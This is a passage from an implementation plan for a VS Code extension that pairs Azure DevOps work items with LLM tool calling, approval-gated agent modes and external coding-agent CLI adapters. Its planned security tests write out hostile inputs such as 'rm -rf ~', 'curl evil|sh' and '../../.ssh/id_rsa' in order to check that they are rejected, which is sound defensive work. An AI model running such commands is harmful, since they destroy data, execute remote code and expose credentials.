1. Configure settings with real PAT
2. Click "Refresh Work Items"
3. Verify work items appear in tree view
4. Click a work item to select it
5. Verify context appears in chat

**Step 4: Test LLM integration**

1. Send a message in chat
2. Verify streaming response
3. Verify code context is included

**Step 5: Test git workflow (branch + changelog)**

1. In a git-enabled workspace: click a work item → "Start Task"
2. Verify a `feature/ADO-<id>-<slug>` branch is created and checked out (status bar shows it)
3. In a non-git folder: verify task pickup is blocked with the warning notification
4. Change the work item state to `Done` via `/status Done`
5. Verify `CHANGELOG.md` was created/updated with the ADO entry, and the update was auto-committed
6. Verify the changelog hook doesn't duplicate entries when the same state change is applied twice
7. In the ADO web portal (or via `getComments`), verify a "Changelog entry added (Done)" comment was posted to the work item's discussion thread, linking back to the changelog
8. Verify re-applying the same state change does NOT post a duplicate ADO comment (idempotency via comment marker check)
9. Toggle `adoCode.changelog.postToAdo` off and complete another task — verify no ADO comment is posted but the local changelog still updates

**Step 6: Commit**

```bash
git add -A
git commit -m "chore: final integration testing and polish"
```

---

## Phase 4: Agent Orchestration, Tool Calling & Multi-Turn (Tasks 21-28)

### Task 21: Add Tool Calling to the LLM Client

**Objective:** Extend the provider abstraction so the chat LLM can call extension tools (get work items, update state, add comments, delegate to external agents) — OpenAI function calling + Anthropic tool use, with an agentic loop.

**Files:**
- Modify: `src/llm/types.ts` (tool types + provider interface)
- Modify: `src/llm/client.ts` (add `chatWithTools` wrapper)
- Create: `src/llm/tools.ts` (tool registry + executor)
- Create: `src/llm/agentic.ts` (agentic loop: call → tool_calls → execute → repeat)
- Modify: `src/llm/providers/openai.ts` (tools support)
- Modify: `src/llm/providers/anthropic.ts` (tool use support)
- Create: `src/test/suite/llm/agentic.test.ts`

**Step 1: Define tool types**

Add to `src/llm/types.ts`:
```typescript
export interface LlmToolParameter {
  type: string;
  description?: string;
  enum?: string[];
  properties?: Record<string, LlmToolParameter>;
  required?: string[];
}

export interface LlmTool {
  name: string;
  description: string;
  parameters: LlmToolParameter; // JSON Schema
}

export interface ToolCall {
  id: string;
  name: string;
  arguments: Record<string, any>;
}

export interface ToolResult {
  toolCallId: string;
  name: string;
  content: string; // stringified JSON or text back to the model
}

export interface LlmAgenticResult {
  text: string;                 // final assistant text
  toolCalls: ToolCall[];        // all calls made during the loop
  iterations: number;
}

export interface LlmProvider {
  streamChat(messages: LlmMessage[], config: LlmConfig, signal?: AbortSignal): AsyncGenerator<LlmStreamChunk>;
  /** Chat with tool-calling support (non-streaming agentic turns). */
  chatWithTools?(messages: LlmMessage[], config: LlmConfig, tools: LlmTool[], signal?: AbortSignal): Promise<{
    text: string;
    toolCalls: ToolCall[];
  }>;
}
```

**Step 2: Create the tool registry**

Create `src/llm/tools.ts` — the map of tool name → implementation. The executor
lives in the extension host so tools can call ADO/git/changelog/agent services:
```typescript
import * as vscode from 'vscode';
import { LlmTool } from './types';
import { Services } from '../services';
import { getSettings, getActiveOrg } from '../config/settings';

export interface ToolExecutor {
  tools: LlmTool[];
  /** Q8: current tool-use mode — inline (approval on mutating), plan (read-only), act (auto-approve). */
  mode: 'inline' | 'plan' | 'act';
  setMode(mode: 'inline' | 'plan' | 'act'): void;
  execute(name: string, args: Record<string, any>): Promise<string>;
}

// Q8: read-only tools are always allowed (inline/plan/act).
const READ_ONLY_TOOLS = new Set(['get_work_items', 'get_work_item', 'read_file', 'get_selection', 'list_workspace']);
// Q8: mutating tools need approval in inline mode; auto-approved in act mode;
// BLOCKED in plan mode (plan must never change state).
const MUTATING_TOOLS = new Set(['update_work_item_state', 'add_comment', 'delegate_to_agent', 'apply_diff', 'edit_file', 'run_terminal_command']);

export function createToolExecutor(
  services: Services,
  context: vscode.ExtensionContext, // M4: for getActiveOrg (workspaceState)
  hooks?: {
    onDelegate?: (prompt: string, agent?: string) => Promise<string>;
    onUpdateState?: (id: number, state: string) => Promise<void>;
    onApprove?: (name: string, args: Record<string, any>) => Promise<boolean>;
  }
): ToolExecutor {
// M-6 fix: mode lives on `state` (mutated by setMode) — no closure var.
const state = { mode: 'inline' as 'inline' | 'plan' | 'act' };
const tools: LlmTool[] = [
    {
      name: 'get_work_items',
      description: 'List open work items assigned to the current user in Azure DevOps',
      parameters: { type: 'object', properties: {} },
    },
    {
      name: 'get_work_item',
      description: 'Get details (description, acceptance criteria, comments) of one work item',
      parameters: {
        type: 'object',
        properties: { id: { type: 'number', description: 'Work item ID' } },
        required: ['id'],
      },
    },
    {
      name: 'update_work_item_state',
      description: "Change a work item's state (e.g. Active, Resolved, Done, Closed)",
      parameters: {
        type: 'object',
        properties: {
          id: { type: 'number' },
          state: { type: 'string', description: 'New state' },
        },
        required: ['id', 'state'],
      },
    },
    {
      name: 'add_comment',
      description: 'Add a comment to a work item discussion thread',
      parameters: {
        type: 'object',
        properties: { id: { type: 'number' }, text: { type: 'string' } },
        required: ['id', 'text'],
      },
    },
    {
      name: 'delegate_to_agent',
      description: 'Hand a coding task to an installed external agent CLI (Claude Code, Codex, OpenCode, Hermes, Pi, OpenClaw, Aider, Gemini, Cursor). Returns the agent output.',
      parameters: {
        type: 'object',
        properties: {
          prompt: { type: 'string', description: 'Full task instructions for the agent' },
          agent: { type: 'string', description: 'Agent name (claude, codex, opencode, hermes, pi, openclaw, aider, gemini, cursor-agent); omit for auto-pick' },
        },
        required: ['prompt'],
      },
    },
    // ── Q3 resolution: code tools ─────────────────────────────────────────
    {
      name: 'read_file',
      description: 'Read a workspace file (or a line range) and return its contents',
      parameters: {
        type: 'object',
        properties: {
          path: { type: 'string', description: 'Workspace-relative file path' },
          startLine: { type: 'number' },
          endLine: { type: 'number' },
        },
        required: ['path'],
      },
    },
    {
      name: 'get_selection',
      description: 'Return the text currently selected in the active editor',
      parameters: { type: 'object', properties: {} },
    },
    {
      name: 'list_workspace',
      description: 'List files in the workspace root (optionally filtered by glob)',
      parameters: {
        type: 'object',
        properties: { glob: { type: 'string', description: 'e.g. src/**/*.ts' } },
      },
    },
    {
      name: 'apply_diff',
      description: 'Apply a unified diff to a workspace file (mutating)',
      parameters: {
        type: 'object',
        properties: {
          path: { type: 'string' },
          diff: { type: 'string', description: 'Unified diff text' },
        },
        required: ['path', 'diff'],
      },
    },
    {
      name: 'edit_file',
      description: 'Replace text in a workspace file (mutating)',
      parameters: {
        type: 'object',
        properties: {
          path: { type: 'string' },
          oldText: { type: 'string' },
          newText: { type: 'string' },
        },
        required: ['path', 'oldText', 'newText'],
      },
    },
    {
      name: 'run_terminal_command',
      description: 'Run a shell command in the workspace (mutating; restricted in act mode)',
      parameters: {
        type: 'object',
        properties: { command: { type: 'string' } },
        required: ['command'],
      },
    },
  ];

  const settings = getSettings();
  // M4 fix: don't capture `project` once — resolve the ACTIVE project per
  // execute() so an org switch (Q1) takes effect without recreating the executor.
  const activeProject = () => getActiveOrg(context, settings).project;

  return {
    tools,
    // M-6 fix: mode lives on a mutable `state` object — the closure var would
    // leave the exported property stale after setMode. Reads/writes go through
    // `state.mode`.
    get mode() { return state.mode; },
    setMode(m: 'inline' | 'plan' | 'act') { state.mode = m; },
    async execute(name, args) {
      const project = activeProject();
      // ── Q8 mode gating ─────────────────────────────────────────────
      // LOW fix: READ_ONLY_TOOLS now used explicitly — plan mode allows ONLY
      // read-only tools (defense-in-depth on top of the mutating block).
      if (state.mode === 'plan' && !READ_ONLY_TOOLS.has(name)) {
        return JSON.stringify({ error: `tool '${name}' is not read-only and not allowed in plan mode` });
      }
      if (MUTATING_TOOLS.has(name)) {
        if (state.mode === 'plan') {
          return JSON.stringify({ error: `tool '${name}' is mutating and not allowed in plan mode` });
        }
        // C3 fix: inline mode REQUIRES an approval hook. If none is wired,
        // DENY — never silently execute a mutating tool.
        if (state.mode === 'inline') {
          if (!hooks?.onApprove) {
            return JSON.stringify({ error: `tool '${name}' requires approval, but no approval hook is wired` });
          }
          const ok = await hooks.onApprove(name, args);
          if (!ok) return JSON.stringify({ error: `tool '${name}' rejected by user` });
        }
        // C3 fix: act mode still enforces the terminal allowlist on
        // run_terminal_command (tokenized, operator-free — see helper below).
        if (name === 'run_terminal_command' && state.mode === 'act') {
          const allowlist = vscode.workspace.getConfiguration('adoCode').get<string[]>('act.terminalAllowlist', ['npm test', 'npm run lint', 'git diff', 'git status']);
          const command = String(args.command ?? '');
          if (!isAllowlistedCommand(command, allowlist)) {
            return JSON.stringify({ error: `command not allowed in act mode (allowlist + no shell operators): ${command}` });
          }
        }
      }
      switch (name) {
        case 'get_work_items': {
          const items = await services.ado.getWorkItemsAssignedTo(project);
          return JSON.stringify(items.map(i => ({ id: i.id, title: i.fields['System.Title'], state: i.fields['System.State'], type: i.fields['System.WorkItemType'] })));
        }
        case 'get_work_item': {
          const { detail, comments } = await services.ado.getWorkItemWithDiscussion(project, args.id);
          return JSON.stringify({
            id: detail.id,
            title: detail.fields['System.Title'],
            state: detail.fields['System.State'],
            description: detail.fields['System.Description'],
            acceptanceCriteria: detail.fields['Microsoft.VSTS.Common.AcceptanceCriteria'],
            tags: detail.fields['System.Tags'],
            thread: comments.map(c => ({ author: c.createdBy.displayName, text: c.text })),
          });
        }
        case 'update_work_item_state':
          // Route through the ChatViewProvider hook so the changelog completion
          // flow (Task 11) fires on Done/Closed. Fallback: direct ADO PATCH.
          if (hooks?.onUpdateState) {
            await hooks.onUpdateState(args.id, args.state);
          } else {
            await services.ado.updateWorkItem(project, args.id, [
              { op: 'add', path: '/fields/System.State', value: args.state },
            ]);
          }
          return JSON.stringify({ ok: true, id: args.id, state: args.state });
        case 'add_comment': {
          const c = await services.ado.addComment(project, args.id, args.text);
          return JSON.stringify({ ok: true, commentId: c.id });
        }
        case 'delegate_to_agent':
          return hooks?.onDelegate
            ? await hooks.onDelegate(args.prompt, args.agent)
            : JSON.stringify({ error: 'agent delegation not wired' });
        // ── Q3 code tools (implemented via VS Code APIs) ─────────────
        case 'read_file': {
          const uri = resolveWorkspacePath(args.path); // C4: path confinement
          const doc = await vscode.workspace.fs.readFile(uri);
          const text = Buffer.from(doc).toString('utf8');
          const lines = text.split('\n');
          const start = (args.startLine ?? 1) - 1;
          const end = args.endLine ?? lines.length;
          return lines.slice(start, end).join('\n');
        }
        case 'get_selection': {
          const editor = vscode.window.activeTextEditor;
          return editor ? editor.document.getText(editor.selection) : '';
        }
        case 'list_workspace': {
          // C4/M18: exclude .git, node_modules, dist, and common secret dirs
          const files = await vscode.workspace.findFiles(args.glob ?? '**/*', '**/{node_modules,.git,dist,.vscode}/**', 500);
          return JSON.stringify(files.map(f => vscode.workspace.asRelativePath(f)));
        }
        case 'apply_diff':
        case 'edit_file': {
          const uri = resolveWorkspacePath(args.path); // C4: path confinement
          const doc = await vscode.workspace.fs.readFile(uri);
          const text = Buffer.from(doc).toString('utf8');
          let updated: string;
          if (name === 'edit_file') {
            // C5: verify the replacement actually matched — no silent no-op.
            if (!args.oldText || !text.includes(args.oldText)) {
              return JSON.stringify({ error: `edit_file: oldText not found in ${args.path}` });
            }
            updated = text.replace(args.oldText, args.newText);
          } else {
            updated = applyUnifiedDiff(text, args.diff);
          }
          await vscode.workspace.fs.writeFile(uri, Buffer.from(updated, 'utf8'));
          return JSON.stringify({ ok: true, path: args.path });
        }
        case 'run_terminal_command': {
          // C3 fix: execFile with arg array and NO shell — `sh -c` would give
          // full shell semantics and nullify the allowlist. Tokenize the
          // command and reject shell operators. C-2 fix: `\s` must NOT be in
          // the operator class (spaces are legal — allowlist entries like
          // `npm test` are multi-word); operators are the dangerous chars.
          const cmd = String(args.command ?? '').trim();
          if (!cmd) {
            return JSON.stringify({ error: 'run_terminal_command: empty command' });
          }
          if (!/^[^&|;`$<>()\r\n]*$/.test(cmd)) {
            return JSON.stringify({ error: `run_terminal_command: shell operators not allowed: ${args.command}` });
          }
          const { execFile } = require('child_process') as typeof import('child_process');
          const argv = cmd.match(/"[^"]*"|\S+/g) ?? [];
          const result = await new Promise<string>((resolve) => {
            execFile(argv[0], argv.slice(1), { cwd: vscode.workspace.workspaceFolders?.[0]?.uri.fsPath, timeout: 120000 }, (err, stdout, stderr) => {
              resolve(stdout || stderr || (err?.message ?? ''));
            });
          });
          return result.slice(0, 8000);
        }
        default:
          return JSON.stringify({ error: `unknown tool: ${name}` });
      }
    },
  };
}

/** C3: allowlist check — command must tokenize to EXACTLY one allowlisted argv, no shell operators. */
function isAllowlistedCommand(command: string, allowlist: string[]): boolean {
  // C-2 fix: `\s` NOT in the operator class (multi-word commands are legal);
  // newlines rejected so multi-line smuggling can't bypass the argv match.
  if (!command || !/^[^&|;`$<>()\r\n]*$/.test(command)) return false;
  const argv = command.match(/"[^"]*"|\S+/g) ?? [];
  return allowlist.some(entry => {
    const expected = entry.match(/"[^"]*"|\S+/g) ?? [];
    return argv.length === expected.length && argv.every((a, i) => a === expected[i]);
  });
}

/** C4: resolve a workspace-relative path and refuse anything escaping the root. */
function resolveWorkspacePath(relativePath: string): vscode.Uri {
  const root = vscode.workspace.workspaceFolders?.[0];
  if (!root) throw new Error('no workspace folder open');
  // M-8 fix: Uri.joinPath NORMALIZES `../` segments instead of leaving them
  // for the check — resolve the fsPath explicitly so escapes are detectable.
  const pathMod = require('path') as typeof import('path');
  const rootFs = pathMod.resolve(root.uri.fsPath);
  const targetFs = pathMod.resolve(pathMod.join(rootFs, relativePath));
  const sep = pathMod.sep;
  if (!(targetFs === rootFs || targetFs.startsWith(rootFs + sep))) {
    throw new Error(`path escapes workspace: ${relativePath}`);
  }
  return vscode.Uri.file(targetFs);
}

/** C5: minimal unified-diff application — hunk-line-aware, verified against source. */
function applyUnifiedDiff(source: string, diff: string): string {
  // Real production implementations should use the `diff` npm package; this
  // inline version handles the common case (single hunk with line numbers)
  // and FAILS LOUDLY instead of corrupting:
  const lines = source.split('\n');
  const hunks = diff.split(/(?=^@@)/m).filter(h => h.startsWith('@@'));
  if (hunks.length === 0) throw new Error('apply_diff: no hunks in diff');
  let result = [...lines];
  let offset = 0; // H-7: cumulative line shift from previously applied hunks
  for (const hunk of hunks) {
    const header = hunk.match(/^@@ -(\d+)(?:,(\d+))? \+(\d+)(?:,(\d+))? @@/);
    if (!header) throw new Error('apply_diff: malformed hunk header');
    const body = hunk.split('\n').slice(1);
    const removed: string[] = [];
    const added: string[] = [];
    for (const line of body) {
      if (line.startsWith('-')) removed.push(line.slice(1));
      else if (line.startsWith('+')) { added.push(line.slice(1)); }
      else if (line.startsWith(' ')) { removed.push(line.slice(1)); added.push(line.slice(1)); }
      else if (line.trim() === '') continue; // trailing blank
    }
    // H-7 fix: verify removed lines against the OLD-file position, and track a
    // running offset so MULTIPLE hunks apply cumulatively (each hunk's `-`
    // line numbers refer to the ORIGINAL file; result is mutated as we go).
    const oldStart = parseInt(header[1], 10) - 1;
    const applied = oldStart + offset;
    for (let i = 0; i < removed.length; i++) {
      if (result[applied + i] !== removed[i]) {
        throw new Error(`apply_diff: context mismatch at line ${applied + i + 1}`);
      }
    }
    result.splice(applied, removed.length, ...added);
    offset += added.length - removed.length;
  }
  return result.join('\n');
}
```
(Note: `hooks.onUpdateState` / `hooks.onDelegate` / `hooks.onApprove` are wired
by `ChatViewProvider` in Task 24 — see the wiring step. Until then the executor
falls back to direct ADO calls, so Task 21 works standalone. `vscode` must be
imported in `tools.ts` for the code tools.)

**Step 3: Agentic loop**

Add to `src/llm/client.ts` (wrapper delegating to the provider):
```typescript
import { LlmMessage, LlmStreamChunk, LlmConfig, LlmProvider, LlmProviderType, LlmTool } from './types';

/** In LlmClient: */
async chatWithTools(messages: LlmMessage[], tools: LlmTool[], signal?: AbortSignal) {
  if (!this.provider.chatWithTools) {
    throw new Error(`provider ${this.config.provider} does not support tool calling`);
  }
  return this.provider.chatWithTools(messages, this.config, tools, signal);
}
```

Create `src/llm/agentic.ts`:
```typescript
import { LlmClient } from './client';
import { LlmMessage, LlmTool, ToolCall, ToolResult, LlmAgenticResult } from './types';
import { ToolExecutor } from './tools';

const DEFAULT_MAX_ITERATIONS = 8;

export async function runAgenticChat(
  client: LlmClient,
  executor: ToolExecutor,
  initialMessages: LlmMessage[],
  signal?: AbortSignal,
  maxIterations: number = DEFAULT_MAX_ITERATIONS
): Promise<LlmAgenticResult> {
  const messages = [...initialMessages];
  const allToolCalls: ToolCall[] = [];

  for (let i = 0; i < maxIterations; i++) {
    const { text, toolCalls } = await client.chatWithTools(messages, executor.tools, signal);

    if (!toolCalls || toolCalls.length === 0) {
      return { text, toolCalls: allToolCalls, iterations: i + 1 };
    }

    allToolCalls.push(...toolCalls);

    // C1 fix: the assistant message MUST carry the tool_calls so the provider
    // can emit its native tool_calls / tool_use block in the next request.
    // (OpenAI 400s if a role:'tool' message has no preceding tool_calls;
    // Anthropic 400s if tool_result's tool_use_id has no matching block.)
    messages.push({
      role: 'assistant',
      content: text || '',
      toolCalls: toolCalls.map(c => ({ id: c.id, name: c.name, arguments: JSON.stringify(c.arguments) })),
    });

    // C1 fix: ONE tool message per result, each carrying its own toolCallId
    // (OpenAI requires one role:'tool' message per tool_call_id).
    for (const call of toolCalls) {
      let content: string;
      try {
        content = await executor.execute(call.name, call.arguments);
      } catch (err) {
        content = JSON.stringify({ error: err instanceof Error ? err.message : String(err) });
      }
      messages.push({ role: 'tool', content, toolCallId: call.id });
    }
  }

  throw new Error(`agentic loop exceeded ${maxIterations} iterations`);
}
```

**Step 4: Provider tool-call support**

Each provider's `chatWithTools` must translate the generic `LlmMessage[]`
(in/out) to its native request/response shape:

- **Request translation (both providers):** walk `messages`:
  - `role:'tool'` + `toolCallId` → OpenAI: `{ role:'tool', tool_call_id, content }`;
    Anthropic: a `user` message whose content is `[{ type:'tool_result', tool_use_id: toolCallId, content }]`.
  - `role:'assistant'` + `toolCalls` → OpenAI: `{ role:'assistant', content, tool_calls: toolCalls.map(tc => ({ id, type:'function', function:{ name, arguments: tc.arguments } })) }` (arguments kept as a JSON *string*);
    Anthropic: `{ role:'assistant', content: [{ type:'text', text: content }] }` + one `{ type:'tool_use', id, name, input: JSON.parse(arguments) }` block per toolCalls entry.
  - plain `system`/`user`/`assistant` → unchanged (Anthropic: `system` stays in the top-level `system` field; first message must be `user` — drop a leading `system`-only turn or merge).
  - **Anthropic C-7 rule:** the agentic loop emits N CONSECUTIVE `role:'tool'`
    messages (one per tool result). Anthropic 400s on consecutive same-role
    messages — merge consecutive translated `tool_result` messages into ONE
    `user` message whose content array holds all the `tool_result` blocks
    (never string-concat the blocks; the content must stay an array).
- **Response parsing (both providers):**
  - OpenAI: `choices[0].message.tool_calls` → `{ id: tc.id, name: tc.function.name, arguments: JSON.parse(tc.function.arguments) }`; text from `choices[0].message.content`.
  - Anthropic: content blocks → `block.type === 'tool_use'` → `{ id: block.id, name: block.name, arguments: block.input }`; text from `text` blocks.
- OpenAI `chatWithTools` sends `stream: false` (simplest correct round-trip); streaming with tools is deferred (see H9 note below).

**Step 5: Tests**

`src/test/suite/llm/agentic.test.ts` — with mocked fetch:
- OpenAI: request contains `tools` array AND a `role:'tool'` message with
  `tool_call_id` matching the assistant's `tool_calls[0].id`; response with
  `tool_calls` triggers executor; final turn returns text.
- Anthropic: request contains `tools`; `tool_use` content block triggers
  executor; next request's `user` message contains a `tool_result` block whose
  `tool_use_id` matches; loop terminates on `message_stop`/text-only turn.
- Loop termination: a tool that keeps being called hits maxIterations → error.
- Round-trip regression: assert the second request body (OpenAI) has exactly one
  `tool` message per tool_call_id and the assistant message carries `tool_calls`.

**Step 6: Verify**

Run: `npm run compile && npm test`
Expected: agentic tests PASS

**Step 7: Tool-security tests (H14)**

Add `src/test/suite/llm/tools.test.ts` covering the C3/C4/C5 fixes:
- `run_terminal_command`: `npm test && rm -rf ~` and `git status; curl evil|sh`
  are REJECTED (shell operators); `git difftool` is REJECTED (not exact argv
  match); `npm test` is allowed; approval hook absent → denied in inline mode.
- `read_file`/`edit_file`/`apply_diff`: `../../.ssh/id_rsa` throws (workspace
  escape, M-8 path.resolve); `/etc/passwd` is confined inside the workspace
  (join-then-resolve semantics) so it resolves to a non-existent file and the
  read fails cleanly; no workspace folder → clean error, no crash.
- `edit_file`: missing oldText → `{error}` not silent `{ok:true}`.
- `applyUnifiedDiff`: hunk at line > 1 applies at the right position;
  context mismatch throws; multi-hunk diff applies both hunks.
- mode gating: plan mode blocks `edit_file`; act mode auto-approves; inline
  mode without `onApprove` hook denies.

**Step 8: Commit**

```bash
git add -A
git commit -m "feat: tool calling with agentic loop (OpenAI + Anthropic)"
```

---

## Known review follow-ups for Task 21 (from second review — see fixes applied in this task)

- C1: `LlmMessage` extended with `toolCallId`/`toolCalls`; loop pushes assistant-with-toolCalls and one tool message per result. ✓ applied above.
- C2: `runAgenticChat` no longer takes `config`; calls `client.chatWithTools(messages, executor.tools, signal)`. ✓ applied above.
- M1: `maxIterations` param added; callers pass `adoCode.act.toolBudget`. Wire in Task 24/26 wiring step.
- C3/C4/C5: tool-security fixes in `tools.ts` (Step 2).

---

### Task 22: External Agent Registry (detect installed CLIs)

**Objective:** Detect which external agent CLIs are installed on the machine (claude, codex, opencode, hermes, pi, openclaw) and expose a uniform capability list.

**Files:**
- Create: `src/agents/registry.ts`
- Create: `src/agents/types.ts`
- Modify: `src/services.ts` (add `agents` service)
- Create: `src/test/suite/agents/registry.test.ts`

**Step 1: Define agent metadata**

Create `src/agents/types.ts`:
```typescript
export type AgentName = 'claude' | 'codex' | 'opencode' | 'hermes' | 'pi' | 'openclaw' | 'aider' | 'gemini' | 'cursor-agent';

export interface AgentCapability {
  name: AgentName;
  displayName: string;
  installed: boolean;
  version?: string;
  /** Modes the adapter supports */
  modes: ('one-shot' | 'session')[];
}

export interface AgentRun {
  id: string;               // local run id (e.g. run-<timestamp>-<workItemId>)
  workItemId?: number;
  agent: AgentName;
  sessionId?: string;       // external agent's session id (for resume)
  workdir: string;
  status: 'running' | 'succeeded' | 'failed' | 'cancelled' | 'interrupted'; // interrupted: extension reloaded mid-run (Q7)
  startedAt: string;
  finishedAt?: string;
  outputFile?: string;      // captured stdout/stderr
  summary?: string;         // final result text
}
```

**Step 2: Registry with detection**

Create `src/agents/registry.ts`:
```typescript
import * as cp from 'child_process';
import { promisify } from 'util';
import { AgentCapability, AgentName } from './types';

const execFile = promisify(cp.execFile);

export interface AgentSpec {
  name: AgentName;
  displayName: string;
  bin: string;               // binary to probe
  versionFlag: string[];
  oneShot: () => string[];   // base args for one-shot run
  session: () => string[];   // base args for session mode
  /** M11 fix: whether the CLI supports session resume (drives Follow-up UI). */
  supportsSession: boolean;
}

export const AGENT_SPECS: Record<AgentName, AgentSpec> = {
  claude: {
    name: 'claude', displayName: 'Claude Code',
    bin: 'claude', versionFlag: ['--version'],
    oneShot: () => ['-p', '--output-format', 'json', '--max-turns', '20'],
    session: () => ['--output-format', 'stream-json'],
    supportsSession: true,
  },
  codex: {
    name: 'codex', displayName: 'Codex CLI',
    bin: 'codex', versionFlag: ['--version'],
    oneShot: () => ['exec', '--sandbox', 'workspace-write', '--json'],
    session: () => ['exec', '--sandbox', 'workspace-write'],
    supportsSession: false, // no session resume — synthesized follow-up (H13)
  },
  opencode: {
    name: 'opencode', displayName: 'OpenCode',
    bin: 'opencode', versionFlag: ['--version'],
    oneShot: () => ['run', '--format', 'json'],
    session: () => ['run'],
    supportsSession: true,
  },
  hermes: {
    name: 'hermes', displayName: 'Hermes Agent',
    bin: 'hermes', versionFlag: ['--version'],
    oneShot: () => ['chat', '-q'],
    session: () => ['chat'],
    supportsSession: true, // hermes chat --continue
  },
  pi: {
    name: 'pi', displayName: 'Pi',
    bin: 'pi', versionFlag: ['--version'],
    oneShot: () => ['-p'],
    session: () => [],
    supportsSession: false,
  },
  openclaw: {
    name: 'openclaw', displayName: 'OpenClaw',
    bin: 'openclaw', versionFlag: ['--version'],
    oneShot: () => ['-p'],
    session: () => [],
    supportsSession: false,
  },
  // ── Q9 resolution: additional v1 agents ───────────────────────────
  aider: {
    name: 'aider', displayName: 'Aider',
    bin: 'aider', versionFlag: ['--version'],
    oneShot: () => ['--message'], // aider --message "<prompt>" --no-git
    session: () => [],
    supportsSession: false,
  },
  gemini: {
    name: 'gemini', displayName: 'Gemini CLI',
    bin: 'gemini', versionFlag: ['--version'],
    oneShot: () => ['-p'],
    session: () => ['-c'], // resume most recent session
    supportsSession: true,
  },
  'cursor-agent': {
    name: 'cursor-agent', displayName: 'Cursor Agent',
    bin: 'cursor-agent', versionFlag: ['--version'],
    oneShot: () => ['exec'],
    session: () => [],
    supportsSession: false,
  },
};

export class AgentRegistry {
  private cache?: AgentCapability[];

  async detect(): Promise<AgentCapability[]> {
    if (this.cache) return this.cache;
    const caps: AgentCapability[] = [];
    for (const spec of Object.values(AGENT_SPECS)) {
      try {
        // M12 fix: on Windows, npm-installed CLIs ship as .cmd shims.
        // M-7 fix: execFile can't execute .cmd without shell:true — probe with
        // a shell on win32 (args are static version flags, no injection risk).
        const bin = process.platform === 'win32' ? `${spec.bin}.cmd` : spec.bin;
        const { stdout } = await execFile(bin, spec.versionFlag, {
          timeout: 5000,
          shell: process.platform === 'win32',
        });
        caps.push({
          name: spec.name,
          displayName: spec.displayName,
          installed: true,
          version: stdout.trim().split('\n')[0],
          modes: spec.supportsSession ? ['one-shot', 'session'] : ['one-shot'],
        });
      } catch {
        caps.push({ name: spec.name, displayName: spec.displayName, installed: false, version: undefined, modes: ['one-shot'] });
      }
    }
    this.cache = caps;
    return caps;
  }

  async getInstalled(): Promise<AgentCapability[]> {
    const all = await this.detect();
    return all.filter(c => c.installed);
  }

  clearCache(): void {
    this.cache = undefined;
  }
}
```

**Step 3: Add to services bundle**

In `src/services.ts`, extend the `Services` interface:
```typescript
export interface Services {
  ado: AdoClient;
  git: GitService;
  changelog: ChangelogService;
  agents: AgentRegistry;
}
```
and in `createServices`: `agents: new AgentRegistry(),`.

**Step 4: Tests**

`src/test/suite/agents/registry.test.ts` — stub `execFile`:
- installed agent → `installed: true` with version
- missing binary → `installed: false`, no throw
- `getInstalled()` filters

**Step 5: Verify + Commit**

Run: `npm run compile && npm test`
Commit: `feat: external agent registry with CLI detection`

---

### Task 23: Agent Adapters (uniform one-shot + session interface)

**Objective:** Implement an adapter per agent that normalizes launching, streaming output, and session resume — so the rest of the extension treats every agent identically.

**Files:**
- Create: `src/agents/adapters/ClaudeAdapter.ts`
- Create: `src/agents/adapters/CodexAdapter.ts`
- Create: `src/agents/adapters/OpenCodeAdapter.ts`
- Create: `src/agents/adapters/HermesAdapter.ts`
- Create: `src/agents/adapters/GeminiAdapter.ts` (M-2: Q9 gemini — listed here so the factory import resolves)
- Create: `src/agents/adapters/GenericAdapter.ts` (pi, openclaw, aider, cursor-agent fallback)
- Create: `src/agents/adapters/types.ts` (Adapter interface)
- Create: `src/test/suite/agents/adapters.test.ts`

**Step 1: Adapter interface**

Create `src/agents/adapters/types.ts`:
```typescript
import { AgentRun } from '../types';

export interface AgentAdapter {
  readonly name: string;
  /** Launch a one-shot task; resolves when the agent exits. exitCode null = aborted/killed (H7). */
  runTask(run: AgentRun, prompt: string, signal?: AbortSignal): Promise<{ exitCode: number | null; output: string }>;
  /** Resume a previous session with a follow-up prompt. */
  resumeTask?(run: AgentRun, followUp: string, signal?: AbortSignal): Promise<{ exitCode: number | null; output: string }>;
  /** Extract the external session id from one-shot output (for later resume). */
  extractSessionId?(output: string): string | undefined;
}
```

**Step 2: Claude Code adapter (print mode + JSON)**

Create `src/agents/adapters/ClaudeAdapter.ts`:
```typescript
import * as cp from 'child_process';
import { AgentAdapter } from './types';
import { AgentRun } from '../types';

export class ClaudeAdapter implements AgentAdapter {
  readonly name = 'claude';

  private spawn(args: string[], cwd: string, signal?: AbortSignal): Promise<{ exitCode: number | null; output: string }> {
    return new Promise((resolve) => {
      const child = cp.spawn('claude', args, { cwd, signal });
      let output = '';
      child.stdout.on('data', d => { output += d.toString(); });
      child.stderr.on('data', d => { output += d.toString(); });
      child.on('error', err => resolve({ exitCode: 1, output: `failed to spawn: ${err.message}` }));
      // H7 fix: keep `code` as-is (null on abort) — the runner maps null → cancelled.
      child.on('close', code => resolve({ exitCode: code, output }));
    });
  }

  runTask(run: AgentRun, prompt: string, signal?: AbortSignal) {
    // claude -p "<prompt>" --output-format json --max-turns 20 --allowedTools ...
    const args = ['-p', prompt, '--output-format', 'json', '--max-turns', '20', '--allowedTools', 'Read,Edit,Write,Bash'];
    return this.spawn(args, run.workdir, signal);
  }

  resumeTask(run: AgentRun, followUp: string, signal?: AbortSignal) {
    // Requires session id captured at run time: claude -p "<followUp>" --resume <id>
    if (!run.sessionId) throw new Error('no session id to resume');
    return this.spawn(['-p', followUp, '--resume', run.sessionId, '--output-format', 'json', '--max-turns', '10'], run.workdir, signal);
  }

  extractSessionId(output: string): string | undefined {
    try {
      const parsed = JSON.parse(output);
      return typeof parsed.session_id === 'string' ? parsed.session_id : undefined;
    } catch {
      return undefined;
    }
  }
}
```

**Step 3: Codex / OpenCode / Hermes adapters**

Same shape, different commands (from the CLI references):
- `CodexAdapter`: `codex exec --sandbox workspace-write "<prompt>"` (needs PTY in
  interactive shells; use `--json` where available). Resume unsupported → no
  `resumeTask`; instead re-run with a fresh prompt containing prior context.
- `OpenCodeAdapter`: `opencode run "<prompt>" --format json`; session id from
  output (`session_id` field); resume with `opencode run "<followUp>" -s <id>`.
- `HermesAdapter`: `hermes chat -q "<prompt>"` one-shot; resume via
  `hermes chat -q "<followUp>" --continue` (most recent session in workdir) —
  no explicit session id needed.
- `GenericAdapter` (pi, openclaw, aider, cursor-agent): `pi -p "<prompt>"` style;
  no resume; one-shot only. Documented as best-effort — these agents' CLI
  contracts vary, so the adapter uses the registry spec + spawn. For aider,
  append `--no-git` (aider manages commits by default; we defer to our branch
